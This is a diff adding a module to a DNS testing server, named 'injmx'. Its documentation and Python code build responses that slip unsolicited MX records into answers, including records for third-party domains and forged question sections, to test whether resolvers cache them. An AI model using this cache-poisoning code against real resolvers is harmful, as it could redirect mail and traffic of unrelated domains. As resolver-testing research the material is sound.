@@ -1,0 +1,302 @@
+[module]
+name = "injmx"
+type = "feature"
+info = "MX Record Injection"
+short = "Record injection - Send unsolicited MX records"
+category = "Cache poisoning"
+records = "A, AAAA, PTR, NS, MX, CNAME, DNAME"
+desc = '''
+This module was designed for cache poisoning experiments, specifically for injecting **unsolicited MX records** into responses.
+
+The module can handle queries for the following record types:
+
+- A (Address Record)
+- AAAA (IPv6 Address Record)
+- CNAME (Canonical Name)
+- DNAME (Delegation Name)
+- MX (Mail Exchange)
+- NS (Name Server)
+- PTR (Pointer)
+
+When a query for any of these record types is received, the module responds with a standard answer based on the requested type. Additionally, it includes an **unsolicited MX record** in the response, aiming for the resolver to pick it up and store it in its cache.
+
+If successful, this means we can inject DNS records into the resolver's cache by including unsolicited records in the responses from the server-side.
+'''
+format = '''
+**`injmx\[N].\[3rp].\[rpq].\[adq].\[rev].\[als].\[oi].yourdomain.com`**
+
+Where:
+
+- The **`N`** optional parameter is an arbitrary number used as an identifier appended to the injected domain name. This helps label and distinguish the specific domain name being injected.
+- The **`3rp`** optional parameter uses a **3rd-party** parent domain (such as **a3rdparty.net**) for the injected record, instead of the **yourdomain.com** (default). If successful, the impact would be much more serious, as it would allow the injection of information for an arbitrary 3rd-party domain.
+- The **`rpq`** (replace question) optional parameter **replaces** the question in the query section with the domain name matching the injected record, potentially convincing the resolver that it originally requested the unsolicited record.
+- The **`adq`** (add question) optional parameter **adds** an additional question in the query section asking for the injected record, which could similarly convince the resolver that it requested the unsolicited record.
+- The **`rev`** (reverse) optional parameter **reverses the order** of answers - placing the unsolicited record first, followed by the actual answer to the query.
+- The **`als`** (all sections) optional parameter places the unsolicited records in all three sections (ANSWER, AUTHORITY and ADDITIONAL), instead of just in the ANSWER section. This approach can potentially increase the likelihood of the injected information being picked up and stored.
+- The **`oi`** (only injected) optional parameter causes the response to **contain only** the unsolicited record, omitting the actual answer to the query entirely.
+
+Note that all these parameters can be combined with one another to produce different injection variants.
+'''
+seealso = "inja, injaaaa, injptr, injcname, injdname, injns, injmx"
+
+[[module.example]]
+description = "In this example, we demonstrate the basic functionality. By default, the injected record appears as the second answer, following the first (legitimate) answer. The injected record unsolicitedly resolves a subdomain under the same parent domain. In the subsequent query, we verify whether the resolver picked up and cached the unsolicited record:"
+command = "dig injmx.yourdomain.com @10.211.55.2; dig injected.yourdomain.com @10.211.55.2 +norecurse"
+append = "We can see that the injected record was not cached, as we received `NXDOMAIN` (No such name) status. This means that the injection did not succeed."
+
+[[module.example]]
+description = "In this example, we use the identifier `123` to label the injected domain name, resulting in the generation of a specific domain name with the same label:"
+command = "dig injmx123.yourdomain.com @10.211.55.2"
+append = "This helps in identifying specific test cases during the testing process."
+
+[[module.example]]
+description = "As mentioned earlier, this module can respond to various record types, not just A records. In this example, we request an NS record. As a result, we receive a valid NS record followed by an unsolicited MX record:"
+command = "dig NS injmx.yourdomain.com @10.211.55.2"
+append = "The module can handle A, AAAA, CNAME, DNAME, MX, NS and PTR record queries."
+
+[[module.example]]
+description = "In the following example, we use the **3rp** (3rd-party) parameter to request that the unsolicited record contain a subdomain under a 3rd-party parent domain. If successful, this scenario would have a much greater impact. In the subsequent query, we verify again whether the resolver picked up and cached the unsolicited record:"
+command = "dig injmx123.3rp.yourdomain.com @10.211.55.2; dig injected123.a3rdparty.net @10.211.55.2 +norecurse"
+append = "We can see that the injected record was not cached, as we received `NXDOMAIN` (No such name) status. This means that the injection did not succeed."
+
+[[module.example]]
+description = "In this example, we use the **rev** parameter to reverse the order of answers - the unsolicited record appears first, followed by the legitimate one. This arrangement could potentially increase the likelihood of the injected information being picked up and cached:"
+command = "dig injmx123.3rp.rev.yourdomain.com @10.211.55.2"
+
+[[module.example]]
+description = "In this example, we use the **rpq** parameter to replace the question in the query section with information from the unsolicited record, in an attempt to convince the resolver that it originally requested this record:"
+command = "dig injmx12345.rpq.yourdomain.com @10.211.55.2"
+pcapexplain = '''We can see that the client (dig) did not accept the response because the question (in the response) did not match the question in the original query. Here is the actual DNS response that was sent back to dig in this case:
+'''
+append = "We can see that the question (query) was replaced to match the unsolicited record. The question remains as to how different resolvers would handle such a scenario - some resolvers may potentially accept this response."
+
+[[module.example]]
+description = "In the next example, we use the **adq** parameter to add the question in the response asking for the unsolicited record, as another attempt to convince the resolver that it originally requested this record. We can see again that the client (dig) does not accept this response because the question does not match the original query:"
+command = "dig injmx12345.adq.yourdomain.com @10.211.55.2"
+pcapexplain = "The question remains as to how different resolvers would handle this scenario. Here is the actual DNS response that was generated and returned to dig in this case:"
+append = "We can see that there are two questions - the original query and an additional one matching the unsolicited record."
+
+[[module.example]]
+description = "In this example, the **oi** (only injected) parameter causes the answers to include only the injected (unsolicited) record, without the actual answer to the original query:"
+command = "dig injmx.oi.yourdomain.com @10.211.55.2"
+append = "Note that the question remains the same as in the original query."
+
+[[module.example]]
+description = "Here, we also request to replace the question in the query section with the unsolicited domain name. We can see that the dig client does not accept the response again because the question does not match the original query:"
+command = "dig injmx.oi.rpq.yourdomain.com @10.211.55.2"
+pcapexplain = "The question remains as to how different resolvers would handle such a scenario. Here is the actual DNS response that was sent back to dig in this case:"
+append = "Some resolvers may potentially accept this response."
+
+[[module.example]]
+description = "Lastly, in this example, we use the **als** (all sections) parameter to include the records in all sections of the DNS response:"
+command = "dig injmx.als.yourdomain.com @10.211.55.2"
+append = '''This could potentially increase the likelihood of the injected information being picked up and stored.
+
+Keep in mind that all these parameters can be combined to create different injection variants.
+'''
+
+[module.code]
+python = '''
+if req.first_subdomain.startswith("injmx") and (len(req.first_subdomain) == 5 or req.first_subdomain[5:].isdigit()):
+   # Send a legit record + an injected record
+
+   ####################################
+   # Default values of the parameters
+
+   answers = 2
+   reversed = 0
+   allsections = 0
+   addedquestions = b''
+   req.inj_type_str = 'MX'
+
+   ####################################
+   # Get all the parameters
+
+   index = req.first_subdomain[5:]
+
+   if "3rp" in req.subdomains:  # inject a 3rd party domain
+      injdom = "injected" + index + "." + a3rdparty_domain
+      addcustomlog("3P")
+   else:
+      injdom = "injected" + index + "." + req.sld_tld_domain
+
+   if "rpq" in req.subdomains:  # replace the question with our injected stuffs
+      orig_req_domain = req.full_domain
+      req.full_domain = injdom
+      req.type_bin = getTypeBin(req.inj_type_str) 
+      addcustomlog("RPQ")
+
+   if "adq" in req.subdomains:  # add additional question for our injected stuffs
+      resp.QURR = req.QURR+1
+      addedquestions  = convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + req.class_bin
+      addcustomlog("ADQ")
+
+   if "oi" in req.subdomains:   # only injected
+      answers = 1
+      addcustomlog("OI")
+
+   if "rev" in req.subdomains:  # reversed / injected first
+      reversed = 1
+      addcustomlog("REV")
+
+   if "als" in req.subdomains:  # all sections
+      allsections = 1
+      addcustomlog("ALS")
+
+   ###############################
+   # Now prepare the legit record based on what record type was requested in the query
+
+   okdata = b''
+   match req.type_str:
+     case "A":
+         ip = "1.2.3.4"
+         okdata  = struct.pack(">H", 4)     ## Data length
+         okdata += socket.inet_aton(ip)     ## IP
+     case "AAAA":
+         ip = "1111:2222:3333:4444:5555:6666:7777:8888"
+         okdata = struct.pack(">H", 16)                  ## Data length
+         okdata += socket.inet_pton(socket.AF_INET6, ip) ## IP
+     case "PTR":
+         dom = "always" + str(random.getrandbits(20) % 1000000).zfill(6) + "." + req.sld_tld_domain
+         bindom = convDom2Bin(dom)
+         okdata = struct.pack(">H", len(bindom))   ## Data length
+         okdata += bindom                          ## domain
+     case "MX":
+         dom = "always" + str(random.getrandbits(20) % 1000000).zfill(6) + "." + req.sld_tld_domain
+         bindom = convDom2Bin(dom)
+         okdata = struct.pack(">H", len(bindom)+2) ## Data length
+         okdata += struct.pack(">H", 0)            ## Priority
+         okdata += bindom                          ## domain
+     case "NS":
+         dom = "always" + str(random.getrandbits(20) % 1000000).zfill(6) + "." + req.sld_tld_domain
+         bindom = convDom2Bin(dom)
+         okdata = struct.pack(">H", len(bindom))   ## Data length
+         okdata += bindom                          ## domain
+     case "CNAME":
+         dom = "always" + str(random.getrandbits(20) % 1000000).zfill(6) + "." + req.sld_tld_domain
+         bindom = convDom2Bin(dom)
+         okdata = struct.pack(">H", len(bindom))   ## Data length
+         okdata += bindom                          ## domain
+     case "DNAME":
+         dom = "always" + str(random.getrandbits(20) % 1000000).zfill(6) + "." + req.sld_tld_domain
+         bindom = convDom2Bin(dom)
+         okdata = struct.pack(">H", len(bindom))   ## Data length
+         okdata += bindom                          ## domain
+
+   ###############################
+   # Now prepare the injected MX record
+
+   injdata = b''
+   dom = "always" + str(random.getrandbits(20) % 1000000).zfill(6) + "." + req.sld_tld_domain
+   bindom = convDom2Bin(dom)
+   injdata = struct.pack(">H", len(bindom)+2) ## Data length
+   injdata += struct.pack(">H", 0)            ## Priority
+   injdata += bindom                          ## CNAME value
+
+   ###############################
+   ### DNS header ################
+   if allsections:
+      buffer = prep_dns_header(b'\x84\x00', resp.QURR, answers, answers, answers)
+   else:
+      buffer = prep_dns_header(b'\x84\x00', resp.QURR, answers, 0, 0)
+   ###############################
+   ### QUESTION SECTION ##########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+   buffer += addedquestions
+   ###############################
+   ### ANSWER SECTION ############
+   # first answer
+   if "rpq" in req.subdomains:
+      req.full_domain = orig_req_domain  # switch back to the original domain
+      resp.compress = 0  # query contains the injected domain, cannot use it for compression
+   if answers > 1:
+      if reversed:
+         # reversed order, first injected record
+         buffer += convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + getClassBin("IN")
+         buffer += struct.pack(">L", resp.TTL)
+         buffer += injdata
+      else:
+         # normal order, first legit record
+         buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+         buffer += getTypeBin(req.type_str) + getClassBin("IN")
+         buffer += struct.pack(">L", resp.TTL)
+         buffer += okdata
+   # second answer
+   if reversed and answers > 1:
+      # reversed order, now legit record
+      buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+      buffer += getTypeBin(req.type_str) + getClassBin("IN")
+      buffer += struct.pack(">L", resp.TTL)
+      buffer += okdata
+   else:
+      # normal order, now injected record
+      buffer += convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + getClassBin("IN")
+      buffer += struct.pack(">L", resp.TTL)
+      buffer += injdata
+   ###############################
+   if allsections:
+      ### AUTHORITY SECTION #########
+      # first answer
+      if "rpq" in req.subdomains:
+         req.full_domain = orig_req_domain  # switch back to the original domain
+         resp.compress = 0  # query contains the injected domain, cannot use it for compression
+      if answers > 1:
+         if reversed:
+            # reversed order, first injected record
+            buffer += convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + getClassBin("IN")
+            buffer += struct.pack(">L", resp.TTL)
+            buffer += injdata
+         else:
+            # normal order, first legit record
+            buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+            buffer += getTypeBin(req.type_str) + getClassBin("IN")
+            buffer += struct.pack(">L", resp.TTL)
+            buffer += okdata
+      # second answer
+      if reversed and answers > 1:
+         # reversed order, now legit record
+         buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+         buffer += getTypeBin(req.type_str) + getClassBin("IN")
+         buffer += struct.pack(">L", resp.TTL)
+         buffer += okdata
+      else:
+         # normal order, now injected record
+         buffer += convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + getClassBin("IN")
+         buffer += struct.pack(">L", resp.TTL)
+         buffer += injdata
+      ###############################
+      ### ADDITIONAL SECTION ########
+      # first answer
+      if "rpq" in req.subdomains:
+         req.full_domain = orig_req_domain  # switch back to the original domain
+         resp.compress = 0  # query contains the injected domain, cannot use it for compression
+      if answers > 1:
+         if reversed:
+            # reversed order, first injected record
+            buffer += convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + getClassBin("IN")
+            buffer += struct.pack(">L", resp.TTL)
+            buffer += injdata
+         else:
+            # normal order, first legit record
+            buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+            buffer += getTypeBin(req.type_str) + getClassBin("IN")
+            buffer += struct.pack(">L", resp.TTL)
+            buffer += okdata
+      # second answer
+      if reversed and answers > 1:
+         # reversed order, now legit record
+         buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+         buffer += getTypeBin(req.type_str) + getClassBin("IN")
+         buffer += struct.pack(">L", resp.TTL)
+         buffer += okdata
+      else:
+         # normal order, now injected record
+         buffer += convDom2Bin(injdom) + getTypeBin(req.inj_type_str) + getClassBin("IN")
+         buffer += struct.pack(">L", resp.TTL)
+         buffer += injdata
+   ###############################
+   # log and send
+   log("%s + %s" % (req.type_str, req.inj_type_str))
+   send_buf(self, buffer)
+   #####################################################################
+'''
